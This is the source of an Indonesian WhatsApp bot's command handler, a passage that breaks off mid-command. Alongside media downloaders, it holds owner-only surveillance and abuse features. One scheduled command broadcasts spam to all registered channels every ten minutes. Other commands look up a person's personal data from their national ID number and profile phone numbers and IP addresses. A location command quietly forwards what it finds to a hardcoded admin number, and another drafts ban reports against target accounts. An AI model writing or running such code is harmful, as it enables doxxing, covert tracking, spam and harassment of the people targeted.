//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addallidch": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Masukkan link saluran, pisahkan dengan spasi atau koma.\n\nContoh:\n${prefix + command} https://whatsapp.com/channel/xxxx https://whatsapp.com/channel/yyyy\nAtau:\n${prefix + command} https://whatsapp.com/channel/xxxx,https://whatsapp.com/channel/yyyy`);

    // Pisahkan link berdasarkan spasi atau koma
    let links = text.split(/[\s,]+/).map(v => v.trim()).filter(v => v);
    if (!links.length) return m.reply("Tidak ada link saluran yang valid!");

    let hasil = [];
    let gagal = [];
    let totalFollowers = 0;

    global.channels = loadChannels();
    const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");

    for (let link of links) {
        if (!link.startsWith("https://whatsapp.com/channel/")) {
            gagal.push(`${link} (Format salah)`);
            continue;
        }

        let channelId = link.split("https://whatsapp.com/channel/")[1];
        if (!channelId) {
            gagal.push(`${link} (Gagal ambil ID)`);
            continue;
        }

        try {
            let res = await ZakzzDev.newsletterMetadata("invite", channelId);
            if (!res.id) {
                gagal.push(`${link} (ID tidak valid)`);
                continue;
            }

            if (global.channels.includes(res.id)) {
                gagal.push(`${link} (Sudah terdaftar)`);
                continue;
            }

            let followers = res.subscribers || 0;
            totalFollowers += followers;

            global.channels.push(res.id);
            saveChannels(global.channels);

            hasil.push(
`┌───[ SYSTEM UPDATE ]────────────────────┐
│  CHANNEL BERHASIL DITAMBAHKAN
│
│  ID SALURAN     : ${res.id}
│  NAMA SALURAN   : ${res.name || "Tidak diketahui"}
│  TOTAL PENGIKUT : ${formatNumber(followers)}
│  LINK SALURAN   : ${link}
└────────────────────────────────────┘`
            );

        } catch (e) {
            console.error(e);
            gagal.push(`${link} (Error)`);
        }
    }

    let pesan = "";
    if (hasil.length > 0) {
        pesan += hasil.join("\n\n") + "\n\n";
        pesan += `📊 TOTAL PENGIKUT GABUNGAN : ${formatNumber(totalFollowers)}\n`;
        pesan += `Integrasi selesai. AlwaysZakzz kini menjangkau lebih luas.`;
    }
    if (gagal.length > 0) pesan += "\n\n⚠️ Channel gagal ditambahkan:\n" + gagal.join("\n");

    m.reply(pesan || "Tidak ada channel yang berhasil ditambahkan.");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "autojpmch": {
    if (!isCreator) return m.reply(mess.owner);

    const delay = ms => new Promise(res => setTimeout(res, ms));
    const intervalMin = 10; // lo bisa ubah ke 5, 15, dll
    const delayPerChannel = global.delayJpm || 2000; // 2 detik per saluran

    const qmsg = m.quoted || m;
    const mime = (qmsg.msg || qmsg).mimetype || "";
    const isMedia = /image|video/.test(mime);
    const contentText = text.split("|")[1] || (qmsg.text || "").trim();

    if (text.toLowerCase().startsWith("on")) {
        if (!contentText) return m.reply("⚠️ *Contoh: .autojpmch on|Halo semua!*");
        if (global.autoJpmchInterval) return m.reply("⚠️ Auto JPMCH sudah aktif!");

        global.channels = loadChannels();
        if (!global.channels || global.channels.length === 0) return m.reply("⚠️ Tidak ada saluran terdaftar!");

        global.autoJpmchMessage = contentText;

 
        if (isMedia) {
            const path = await ZakzzDev.downloadAndSaveMediaMessage(qmsg);
            global.autoJpmchMedia = {
                type: /image/.test(mime) ? "image" : "video",
                buffer: fs.readFileSync(path)
            };
            fs.unlinkSync(path);
        } else {
            global.autoJpmchMedia = null;
        }

        const notify = m.sender;

        global.autoJpmchInterval = setInterval(async () => {
            let total = 0;

            await ZakzzDev.sendMessage(notify, {
                text: `⏳ *Mengirim ke ${global.channels.length} channel...*`
            });

            for (const id of global.channels) {
                try {
                    const kirim = global.autoJpmchMedia
                        ? global.autoJpmchMedia.type === "image"
                            ? { image: global.autoJpmchMedia.buffer, caption: global.autoJpmchMessage }
                            : { video: global.autoJpmchMedia.buffer, caption: global.autoJpmchMessage }
                        : { text: global.autoJpmchMessage };

                    await ZakzzDev.sendMessage(id, kirim);
                    total++;
                    await delay(delayPerChannel);
                } catch (err) {
                    console.log(`[AutoJPMCH] Gagal kirim ke ${id}:`, err.message);
                }
            }

            await ZakzzDev.sendMessage(notify, {
                text: `✅ *Berhasil kirim ke ${total} saluran*\n🔁 Ulang dalam ${intervalMin} menit`
            });

        }, intervalMin * 60 * 1000); // Setiap 10 menit

        return m.reply(`
🟢 *Auto JPMCH Aktif!*
💬 Pesan: ${global.autoJpmchMessage}
🖼️ Kirim: ${global.autoJpmchMedia ? global.autoJpmchMedia.type.toUpperCase() : "TEKS SAJA"}
📡 Jumlah Channel: ${global.channels.length}
⏱️ Ulang tiap: ${intervalMin} menit
📌 Untuk menonaktifkan, ketik: *.autojpmch off*
        `);
    }

    if (text.toLowerCase() === "off") {
        if (!global.autoJpmchInterval) return m.reply("⚠️ Auto JPMCH belum aktif.");

        clearInterval(global.autoJpmchInterval);
        global.autoJpmchInterval = null;
        global.autoJpmchMessage = null;
        global.autoJpmchMedia = null;

        return m.reply("🛑 *Auto JPMCH dimatikan!*\n❌ Pesan otomatis tidak dikirim lagi.");
    }

    return m.reply(`
❓ *Auto JPMCH*
➤ .autojpmch on|Pesan
   (balas media untuk foto/video)
➤ .autojpmch off
🔁 Ulang tiap ${intervalMin} menit
`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'setgbonly': {
    const reply = (teks) => ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: m });

    if (!isCreator) return reply('❌ Hanya *Creator* yang bisa mengatur fitur ini.');
    if (!args[0]) return reply(`⚙️ Format salah!\nGunakan: ${prefix + command} on/off`);

    if (args[0].toLowerCase() === 'on') {
        setgbonly.active = true;
        fs.writeFileSync('./library/setgbonly.json', JSON.stringify(setgbonly, null, 2));
        return reply('✅ Mode *Group Only* telah diaktifkan.\nBot hanya bisa digunakan di *grup*.');
    }

    if (args[0].toLowerCase() === 'off') {
        setgbonly.active = false;
        fs.writeFileSync('./library/setgbonly.json', JSON.stringify(setgbonly, null, 2));
        return reply('✅ Mode *Group Only* telah dinonaktifkan.\nBot bisa digunakan di grup maupun chat pribadi.');
    }

    return reply(`⚙️ Format salah!\nGunakan: ${prefix + command} on/off`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "play": {
if (!text) return m.reply(example("dj tiktok"))
await ZakzzDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://aanz-official.my.id/api/download/ytmp3?url="+res.url)

if (anu.download.audio) {
let urlMp3 = anu.download.audio
await ZakzzDev.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'removebg': case 'rmbg': {
    if (!/image/.test(mime)) {
        return Reply("Silakan kirim atau reply foto!");
    }

    let mediaPath;
    try {
        mediaPath = await ZakzzDev.downloadAndSaveMediaMessage(qmsg);

        const { ImageUploadService } = require("node-upload-images");
        const service = new ImageUploadService("pixhost.to");

        const buffer = fs.readFileSync(mediaPath);
        const { directLink } = await service.uploadFromBinary(buffer, "imgtmp.png");

        const removeBgUrl = `https://api.siputzx.my.id/api/iloveimg/removebg?image=${directLink}&scale=2`;

        await ZakzzDev.sendMessage(
            m.chat,
            {
                image: { url: removeBgUrl },
                caption: "✅ Background berhasil dihapus!"
            },
            { quoted: m }
        );

    } catch (error) {
        console.error("Error pada fitur removebg:", error);
        Reply("❌ Gagal menghapus background. Coba lagi nanti!");
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await ZakzzDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://aanz-official.my.id/api/download/ytmp4?url="+res.url)

if (anu.download.video) {
let urlMp3 = anu.download.video
await ZakzzDev.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await ZakzzDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson("https://aanz-official.my.id/api/download/ytmp3?url="+text)
if (anu.download.audio) {
let urlMp3 = anu.download.audio
await ZakzzDev.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await ZakzzDev.updateBlockStatus(mem, "block")
if (m.isGroup) ZakzzDev.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson("https://aanz-official.my.id/api/download/ytmp4?url="+text)
if (anu.download.video) {
let urlMp3 = anu.download.video
await ZakzzDev.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "mediafire": {
    if (!text) {
        return m.reply("Contoh: .mediafire https://www.mediafire.com/file/xxxx/file");
    }

    if (!text.includes("mediafire.com")) {
        return m.reply("❌ Link tidak valid, hanya mendukung *mediafire.com*");
    }

    try {
        const res = await mediafire(text);
        if (!res.link) {
            return m.reply("❌ Error! File tidak ditemukan");
        }

        const caption = `
*Nama File:* ${res.judul}
*Tipe:* ${res.mime}
*Size:* ${res.size}
*Link:* ${res.link}
        `;

        await ZakzzDev.sendMessage(
            m.chat,
            {
                document: { url: res.link },
                fileName: res.judul,
                mimetype: "application/" + res.mime.toLowerCase(),
                caption
            },
            { quoted: m }
        );

    } catch (err) {
        console.error("Error mediafire:", err);
        m.reply("❌ Gagal download dari MediaFire!");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await ZakzzDev.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'apkmod': {
    if (!text) return Reply("Contoh: .apkmod whatsapp");

    try {
        const api = `https://api.siputzx.my.id/api/apimod/apkmod?query=${encodeURIComponent(text)}`;
        const res = await fetch(api);
        const data = await res.json();

        if (!data.status) return Reply("❌ APK tidak ditemukan!");

        let result = data.result;
        let caption = `
*Nama:* ${result.name}
*Versi:* ${result.version}
*Size:* ${result.size}
*Download:* ${result.download}
        `;

        await ZakzzDev.sendMessage(
            m.chat,
            {
                image: { url: result.icon },
                caption
            },
            { quoted: m }
        );

    } catch (err) {
        console.error("Error apkmod:", err);
        Reply("❌ Gagal mencari APK Mod!");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aanz-official.my.id/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await ZakzzDev.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'beritajkt48': {
  try {
    const res = await axios.get('https://api.siputzx.my.id/api/berita/jkt48');
    
    if (!res.data || !res.data.data || res.data.data.length === 0) {
      return m.reply('❌ Tidak ada data berita ditemukan.');
    }

    const berita = res.data.data.slice(0, 10);
    let teks = `📰 *Berita Terbaru JKT48*\n\n`;

    for (let i = 0; i < berita.length; i++) {
      teks += `📌 *${berita[i].judul}*\n🔗 ${berita[i].link}\n\n`;
    }

    await ZakzzDev.sendMessage(m.chat, {
      text: teks.trim(),
      contextInfo: {
        externalAdReply: {
          title: 'Berita Terbaru JKT48',
          body: 'Dibawakan oleh AlwaysZakzz Bot',
          thumbnailUrl: berita[0].image,
          mediaType: 1,
          showAdAttribution: true,
          sourceUrl: berita[0].link
        }
      }
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    m.reply('❌ Gagal mengambil data berita.');
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "nulis": {
    if (!text) return m.reply(`📌 Contoh penggunaan:\n.nulis Oy Wok|Nama: Danzd|Tampan: Pemberani|Alamat: Palsu`);

    const lines = text.split("|");
    const backgroundPath = path.join(__dirname, "source", "media", "bukutulis.jpg");

    if (!fs.existsSync(backgroundPath)) {
        return m.reply("❌ Background buku tulis tidak ditemukan!\nPastikan file ada di folder: media/bukutulis.jpg");
    }

    const wrapText = (ctx, text, maxWidth) => {
        const words = text.split(" ");
        const lines = [];
        let line = "";

        for (let n = 0; n < words.length; n++) {
            const testLine = line + words[n] + " ";
            const metrics = ctx.measureText(testLine);
            const testWidth = metrics.width;

            if (testWidth > maxWidth && n > 0) {
                lines.push(line.trim());
                line = words[n] + " ";
            } else {
                line = testLine;
            }
        }
        lines.push(line.trim());
        return lines;
    };

    try {
        const background = await loadImage(backgroundPath);
        const canvas = createCanvas(background.width, background.height);
        const ctx = canvas.getContext("2d");

        ctx.drawImage(background, 0, 0, canvas.width, canvas.height);

        ctx.fillStyle = "#000";
        ctx.font = "22px Comic Sans MS";
        ctx.textAlign = "left";

        const maxWidth = 700;
        let y = 90;

        for (let inputLine of lines) {
            const wrappedLines = wrapText(ctx, inputLine.trim(), maxWidth);
            for (let wrappedLine of wrappedLines) {
                ctx.fillText(wrappedLine, 90, y);
                y += 40;
            }
        }

        const filename = `nulis_${Date.now()}.png`;
        const filepath = path.join(__dirname, filename);
        const out = fs.createWriteStream(filepath);
        const stream = canvas.createPNGStream();
        stream.pipe(out);

        out.on("finish", () => {
            ZakzzDev.sendMessage(m.chat, {
                image: fs.readFileSync(filepath),
                caption: "✅ Selesai menulis di buku!"
            }, { quoted: m });

            fs.unlinkSync(filepath);
        });
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat memproses perintah.");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "lacakktp": {
    if (!isCreator) return m.reply("❌ Fitur ini hanya bisa digunakan oleh *Creator Bot*.");

    if (!text) return m.reply(example("*Contoh*\nlacakktp 3201123456789001"));

    if (!/^\d{16}$/.test(text.trim())) {
        return m.reply("Format NIK tidak valid. NIK harus 16 digit angka.");
    }

    await m.reply(`🕵️‍♂️ Melacak informasi untuk NIK: *${text.trim()}*...`);

    try {
        const url = `https://api.fandirr.my.id/tools/ktp?nik=${encodeURIComponent(text.trim())}`;
        const data = await fetchJson(url);

        if (!data || !data.nik) {
            throw new Error('Data tidak ditemukan untuk NIK tersebut.');
        }

        let replyText = `*✅ Informasi NIK Ditemukan*\n\n`;
        replyText += `*NIK:* ${data.nik}\n`;
        replyText += `*Provinsi:* ${data.provinsi}\n`;
        replyText += `*Kota/Kabupaten:* ${data.kota}\n`;
        replyText += `*Kecamatan:* ${data.kecamatan}\n`;
        replyText += `*Jenis Kelamin:* ${data.jenis_kelamin}\n`;
        replyText += `*Tanggal Lahir:* ${data.tanggal_lahir}\n`;
        replyText += `*Usia:* ${data.usia}\n`;
        replyText += `*Golongan Darah:* ${data.gol_darah || 'Tidak diketahui'}\n`;
        replyText += `\n*Powered by ${data.creator}*`;

        m.reply(replyText);

    } catch (error) {
        console.error("Error pada fitur lacakktp:", error);
        m.reply(`😥 Gagal melacak NIK.\n\n*Detail Error:* ${error.message}`);
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "lacaknomor": {
    if (!isCreator) return m.reply("❌ Fitur ini hanya bisa digunakan oleh *Creator Bot*.");

    if (!text) return m.reply(example("*Contoh*\n.lacaknomor 08562737292"));

    const phone = text.trim().replace(/\D/g, "");
    if (phone.length < 9 || phone.length > 15) {
        return m.reply("Format nomor HP tidak valid.");
    }

    await m.reply(`📞 Melacak informasi untuk nomor: *${text.trim()}*...`);

    try {
        const url = `https://api.fandirr.my.id/tools/lacakno?no=${encodeURIComponent(phone)}`;
        const data = await fetchJson(url);

        if (!data || !data.nomor) {
            throw new Error('Informasi nomor tidak ditemukan.');
        }

        let replyText = `*✅ Informasi Nomor Ditemukan*\n\n`;
        replyText += `*Nomor:* ${data.nomor}\n`;
        replyText += `*Negara:* ${data.negara}\n`;
        replyText += `*Lokasi:* ${data.lokasi || 'Tidak diketahui'}\n`;
        replyText += `*Operator:* ${data.operator}\n`;
        replyText += `*Jenis:* ${data.type || 'Tidak diketahui'}\n`;
        replyText += `\n*Powered by ${data.creator}*`;

        m.reply(replyText);

    } catch (error) {
        console.error("Error pada fitur lacaknomor:", error);
        m.reply(`😥 Gagal melacak nomor telepon.\n\n*Detail Error:* ${error.message}`);
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "lacaklokasi": {
    if (!isCreator) return m.reply("❌ Fitur ini hanya bisa digunakan oleh *Creator Bot*.");

    const query = text?.trim();
    let lat, lon;

    const coordRegex = /^(-?\d{1,3}(?:\.\d+)?),\s*(-?\d{1,3}(?:\.\d+)?)$/;
    const coordMatch = query?.match(coordRegex);

    if (coordMatch) {
        lat = parseFloat(coordMatch[1]);
        lon = parseFloat(coordMatch[2]);
    }

    else if (/maps\.google\.com|maps\.app\.goo\.gl/.test(query)) {
        const linkCoord = query.match(/(?:q=|@)?(-?\d{1,3}(?:\.\d+)?),\s*(-?\d{1,3}(?:\.\d+)?)/);
        if (linkCoord) {
            lat = parseFloat(linkCoord[1]);
            lon = parseFloat(linkCoord[2]);
        } else {
            return m.reply("❌ Link Google Maps tidak mengandung koordinat.");
        }
    }

    else if (query) {
        const geo = await fetchJson(`https://api.fandirr.my.id/tools/geocode?query=${encodeURIComponent(query)}`);
        if (!geo || !geo.lat || !geo.lon) {
            return m.reply("Nama tempat tidak ditemukan.");
        }
        lat = geo.lat;
        lon = geo.lon;
    }

    else if (m.message?.locationMessage || m.message?.liveLocationMessage) {
        const loc = m.message.locationMessage || m.message.liveLocationMessage;
        lat = loc.degreesLatitude;
        lon = loc.degreesLongitude;
    }

    else {
        return m.reply("Kirim link, lokasi langsung, koordinat, atau nama tempat.\nContoh:\n• `!lacaklokasi Monas Jakarta`\n• `!lacaklokasi -6.2,106.8`\n• `!lacaklokasi https://maps.google.com/?q=-6.2,106.8`");
    }

    try {
        const gmap = await fetchJson(`https://api.fandirr.my.id/tools/gmap?lat=${lat}&lon=${lon}`);
        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        let caption = `*📍 Lokasi Ditemukan*\n\n`;
        caption += `*Latitude:* ${lat}\n*Longitude:* ${lon}\n🌐 ${mapUrl}`;

        await conn.sendMessage(m.chat, {
            image: { url: gmap.mapsUrl },
            caption,
            jpegThumbnail: await getBuffer(gmap.mapsUrl)
        }, { quoted: m });

        const admin = "628xxxx@s.whatsapp.net"; 
        await conn.sendMessage(admin, { text: `🚨 Lokasi Terkirim:\n${caption}` });

    } catch (err) {
        console.error("Error all-in-one lacaklokasi:", err);
        m.reply("❌ Gagal melacak lokasi. Coba lagi.");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "lacakip": {
    if (!isCreator) return m.reply("❌ Fitur ini hanya bisa digunakan oleh *Creator Bot*.");

    if (!text) return m.reply("⚠️ Contoh penggunaan:\n!lacakip 8.8.8.8");

    const ip = text.trim();
    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;

    if (!ipRegex.test(ip)) {
        return m.reply("❌ Format IP tidak valid.\nContoh: 8.8.8.8");
    }

    await m.reply(`🕵️‍♂️ Melacak IP: *${ip}*...`);

    try {
        const ipInfo = await fetchJson(`https://api.fandirr.my.id/tools/lacakip?ip=${ip}`);
        if (!ipInfo || !ipInfo.ip) throw new Error("IP tidak ditemukan.");

        const map = await fetchJson(`https://api.fandirr.my.id/tools/gmap?lat=${ipInfo.latitude}&lon=${ipInfo.longitude}`);

        let info = `*🌐 Informasi IP*\n\n`;
        info += `*IP Address:* ${ipInfo.ip} (${ipInfo.version})\n`;
        info += `*Kota:* ${ipInfo.city || 'Tidak diketahui'}\n`;
        info += `*Wilayah:* ${ipInfo.region || 'Tidak diketahui'}\n`;
        info += `*Negara:* ${ipInfo.country || '-'} (${ipInfo.country_code})\n`;
        info += `*Koordinat:* ${ipInfo.latitude}, ${ipInfo.longitude}\n`;
        info += `*Kode Pos:* ${ipInfo.postal || '-'}\n`;
        info += `*Zona Waktu:* ${ipInfo.timezone}\n`;
        info += `*Provider:* ${ipInfo.org}\n`;
        info += `*ASN:* ${ipInfo.asn}\n`;
        info += `\n*🔗 Maps:* https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;

        await conn.sendMessage(m.chat, {
            image: { url: map.mapsUrl },
            caption: info,
            jpegThumbnail: await getBuffer(map.mapsUrl)
        }, { quoted: m });

    } catch (e) {
        console.error("Error lacakip:", e);
        m.reply("❌ Gagal melacak IP. Pastikan IP benar.");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aanz-official.my.id/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await ZakzzDev.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "capcut": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aanz-official.my.id/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await ZakzzDev.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "unband": {
    if (!isCreator) return m.reply("❌ Perintah ini hanya untuk *Owner/Creator Bot*.");

    if (!text) return m.reply(`📌 Contoh penggunaan:\n.unband 62858xxxxxx akun saya diblokir karena tidak spam`);

    const manualNumber = text.match(/\d{10,15}/)?.[0];
    if (!manualNumber) return m.reply("❗ Nomor WhatsApp tidak ditemukan. Contoh: .unband 62858xxxxxx alasan...");

    const nomor = manualNumber;
    const alasan = text.replace(manualNumber, "").trim() || "Saya tidak merasa melakukan pelanggaran.";

    const subject = encodeURIComponent(`Permintaan Unban Akun WhatsApp ${nomor}`);
    const body = encodeURIComponent(`
Halo Tim WhatsApp,

Saya ingin mengajukan banding atas pemblokiran akun saya: +${nomor}

📝 Alasan:
${alasan}

Saya mohon akun saya ditinjau ulang karena saya merasa tidak melakukan pelanggaran terhadap kebijakan WhatsApp.

Terima kasih.
    `.trim());

    const mailto = `https://mail.google.com/mail/?view=cm&fs=1&to=support@support.whatsapp.com&su=${subject}&body=${body}`;

    const templatePlain = `
📄 *Template Email Unban*

Ke: support@support.whatsapp.com  
Subjek: Permintaan Unban Akun WhatsApp ${nomor}

Isi:
Halo Tim WhatsApp,

Saya ingin mengajukan banding atas pemblokiran akun saya: +${nomor}

📝 Alasan:
${alasan}

Saya mohon akun saya ditinjau ulang karena saya merasa tidak melakukan pelanggaran terhadap kebijakan WhatsApp.

Terima kasih.
    `.trim();

    global.lastUnbanTemplate = templatePlain;

    return ZakzzDev.sendMessage(m.chat, {
        text: `
🔓 *Permintaan Unban Siap!*

📱 *Nomor:* +${nomor}
📝 *Alasan:* ${alasan}

────────────── ⬇️ *Langkah Banding* ⬇️ ──────────────

📧 *1. Kirim Email Banding Otomatis*
Klik tombol "Kirim Email" untuk langsung buka Gmail.

🛠 *2. Banding Lewat Aplikasi WhatsApp*
➤ Buka WhatsApp ➜ klik *Ajukan Banding*
➤ Gunakan alasan berikut saat mengisi:

"${alasan}"

📄 Atau klik "Salin Template" untuk email manual.
        `.trim(),
        footer: "AlwaysZakzz Unban Assistant",
        buttons: [
            { buttonId: mailto, buttonText: { displayText: "📧 Kirim Email" }, type: 1 },
            { buttonId: ".templateunban", buttonText: { displayText: "📄 Salin Template" }, type: 1 },
            { buttonId: ".batalunban", buttonText: { displayText: "❌ Batal" }, type: 1 }
        ],
        headerType: 1
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "templateunban": {
    if (!isCreator) return m.reply("❌ Perintah ini hanya untuk *Owner/Creator Bot*.");
    if (!global.lastUnbanTemplate) return m.reply("❗ Belum ada template. Ketik `.unband [nomor alasan]` dulu.");

    return m.reply(global.lastUnbanTemplate);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "batalunban": {
    if (!isCreator) return m.reply("❌ Perintah ini hanya untuk *Owner/Creator Bot*.");

    global.lastUnbanTemplate = null;
    return m.reply("❌ Permintaan unban dibatalkan dan template dihapus.");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "bannedwa": {
    if (!isCreator) return m.reply("❌ Perintah ini hanya untuk *Owner/Creator Bot*.");
    if (!text) return m.reply(`📌 Contoh penggunaan:\n.bannedwa 62812xxxxxx spam grup/penipuan`);

    const nomorTarget = text.match(/\d{10,15}/)?.[0];
    const alasan = text.replace(nomorTarget, "").trim();

    if (!nomorTarget || !alasan)
        return m.reply("❗ Mohon sertakan *nomor dan alasan laporan*.\nContoh:\n.bannedwa 62812xxxxxx spam grup");

    const pelapor = m.sender.replace(/@.+/, "");

    const subject = encodeURIComponent(`Laporan Akun WhatsApp ${nomorTarget}`);
    const body = encodeURIComponent(`
Halo Tim WhatsApp,

Saya ingin melaporkan akun WhatsApp dengan nomor: +${nomorTarget}

📝 Alasan:
${alasan}

Mohon ditinjau karena saya merasa akun tersebut melanggar kebijakan WhatsApp.

Dikirim oleh: +${pelapor}
    `.trim());

    const mailto = `https://mail.google.com/mail/?view=cm&fs=1&to=support@support.whatsapp.com&su=${subject}&body=${body}`;

    const templateReport = `
📄 *Template Laporan Akun WhatsApp*

Ke: support@support.whatsapp.com  
Subjek: Laporan Akun WhatsApp ${nomorTarget}

Isi:
Halo Tim WhatsApp,

